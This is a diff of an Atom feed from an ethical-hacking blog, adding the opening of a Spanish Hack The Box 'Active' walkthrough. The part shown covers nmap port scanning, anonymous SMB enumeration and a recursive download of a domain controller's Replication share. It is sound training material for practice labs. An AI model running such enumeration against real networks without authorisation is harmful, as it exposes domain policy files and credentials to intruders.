@@ -1,4 +1,355 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-11-28T22:10:03-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Nineveh</title><link href="http://localhost:4000/htb-nineveh/" rel="alternate" type="text/html" title="Hack The Box Nineveh" /><published>2021-11-28T00:00:00-06:00</published><updated>2021-11-28T00:00:00-06:00</updated><id>http://localhost:4000/htb-nineveh</id><content type="html" xml:base="http://localhost:4000/htb-nineveh/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/banner-nineveh.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-05T22:39:16-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Active</title><link href="http://localhost:4000/htb-active/" rel="alternate" type="text/html" title="Hack The Box Active" /><published>2021-12-05T00:00:00-06:00</published><updated>2021-12-05T00:00:00-06:00</updated><id>http://localhost:4000/htb-active</id><content type="html" xml:base="http://localhost:4000/htb-active/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-active/banner-active.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;active&quot;&gt;Active&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.100.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.100
+PING 10.10.10.100 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.100&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.100: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;136 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.100 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.281/136.281/136.281/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.100 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-28 22:17 CST
+Initiating SYN Stealth Scan at 22:17         
+Scanning 10.10.10.100 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]        
+Discovered open port 445/tcp on 10.10.10.100  
+Discovered open port 139/tcp on 10.10.10.100  
+Discovered open port 135/tcp on 10.10.10.100  
+Discovered open port 53/tcp on 10.10.10.100 
+Discovered open port 5722/tcp on 10.10.10.100
+Discovered open port 464/tcp on 10.10.10.100  
+Discovered open port 49155/tcp on 10.10.10.100
+Discovered open port 49182/tcp on 10.10.10.100
+Discovered open port 49158/tcp on 10.10.10.100                                                                                   
+Discovered open port 49169/tcp on 10.10.10.100
+Discovered open port 636/tcp on 10.10.10.100  
+Discovered open port 49157/tcp on 10.10.10.100
+Discovered open port 9389/tcp on 10.10.10.100                                                                                    
+Discovered open port 88/tcp on 10.10.10.100                                                                                      
+Discovered open port 49152/tcp on 10.10.10.100
+Discovered open port 49154/tcp on 10.10.10.100  
+Discovered open port 49153/tcp on 10.10.10.100  
+Discovered open port 389/tcp on 10.10.10.100    
+Discovered open port 3269/tcp on 10.10.10.100   
+Discovered open port 49171/tcp on 10.10.10.100  
+Discovered open port 3268/tcp on 10.10.10.100   
+Discovered open port 593/tcp on 10.10.10.100    
+Completed SYN Stealth Scan at 22:18, 14.26s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.100               
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
+Scanned at 2021-11-28 22:17:47 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;15s      
+Not shown: 65477 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 36 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5722/tcp  open  msdfsr           syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49152/tcp open  unknown          syn-ack ttl 127
+49153/tcp open  unknown          syn-ack ttl 127
+49154/tcp open  unknown          syn-ack ttl 127
+49155/tcp open  unknown          syn-ack ttl 127
+49157/tcp open  unknown          syn-ack ttl 127
+49158/tcp open  unknown          syn-ack ttl 127
+49169/tcp open  unknown          syn-ack ttl 127
+49171/tcp open  unknown          syn-ack ttl 127
+49182/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.36 seconds
+           Raw packets sent: 69987 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.079MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 68046 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.722MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.100
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49169,4917
+       │ 1,49182
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p53&lt;/span&gt;,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49169,49171,49182 10.10.10.100 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-28 22:22 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.100
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15D39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows Server 2008 R2 SP1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15D39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+88/tcp    open  tcpwrapped
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: active.htb, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: active.htb, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49169/tcp open  msrpc         Microsoft Windows RPC
+49171/tcp open  msrpc         Microsoft Windows RPC
+49182/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 4m57s
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-11-29T04:28:39
+|_  start_date: 2021-11-29T04:26:46
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;74.86 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos abierto el puerto 445, por lo que podríamos tratar de ver recursos con una &lt;em&gt;Null session&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.100 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+Anonymous login successful
+
+        Sharename       Type      Comment
+        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Remote Admin
+        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;             Disk      Default share
+        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+SMB1 disabled &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no workgroup available
+❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.100
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
+        Disk                                                    Permissions     Comment
+        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
+        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
+        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   NO ACCESS       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        Users                                                   NO ACCESS
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Observamos que tenemos permisos de lectura bajo el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Replication&lt;/code&gt;, así que vamos a echarle un ojo. Como vemos que cuenta con múltiples directorios internos uno dentro de otro, mejor vamos descargarlos a nuestro equipo de atacante (&lt;strong&gt;Nota&lt;/strong&gt;: En este caso se descargan debido a que son relativamente pocos, en caso de que sean muchos, es recomendable crear una mountura).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient //10.10.10.100/Replication &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+Anonymous login successful
+Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; 
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Sat Jul 21 05:37:44 2018
+  ..                                  D        0  Sat Jul 21 05:37:44 2018
+  active.htb                          D        0  Sat Jul 21 05:37:44 2018
+
+                10459647 blocks of size 4096. 5728098 blocks available
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; recurse ON
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; prompt OFF
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; mget &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;PT.INI of size 23 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/GPT.INI &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 0.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;PT.INI of size 22 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/GPT.INI &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 0.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;roup Policy&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;PE.INI of size 119 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/Group Policy/GPE.INI &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.2 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 0.1 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ACHINE&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;egistry.pol of size 2788 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/MACHINE/Registry.pol &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 1.3 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ACHINE&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;references&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;roups&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;roups.xml of size 533 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/MACHINE/Preferences/Groups/Groups.xml &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 1.3 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ACHINE&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows NT&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ecEdit&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;ptTmpl.inf of size 1098 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 1.4 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ACHINE&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows NT&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ecEdit&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;ptTmpl.inf of size 3722 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6.7 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 2.1 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez que nos hayamos descargado los recursos a nuestra máquina de atacante, vamos a echarles un ojo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ tree
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+└── active.htb
+    ├── DfsrPrivate
+    │   ├── ConflictAndDeleted
+    │   ├── Deleted
+    │   └── Installing
+    ├── Policies
+    │   ├── &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    │   │   ├── GPT.INI
+    │   │   ├── Group Policy
+    │   │   │   └── GPE.INI
+    │   │   ├── MACHINE
+    │   │   │   ├── Microsoft
+    │   │   │   │   └── Windows NT
+    │   │   │   │       └── SecEdit
+    │   │   │   │           └── GptTmpl.inf
+    │   │   │   ├── Preferences
+    │   │   │   │   └── Groups
+    │   │   │   │       └── Groups.xml
+    │   │   │   └── Registry.pol
+    │   │   └── USER
+    │   └── &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    │       ├── GPT.INI
+    │       ├── MACHINE
+    │       │   └── Microsoft
+    │       │       └── Windows NT
+    │       │           └── SecEdit
+    │       │               └── GptTmpl.inf
+    │       └── USER
+    └── scripts
+
+22 directories, 7 files
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
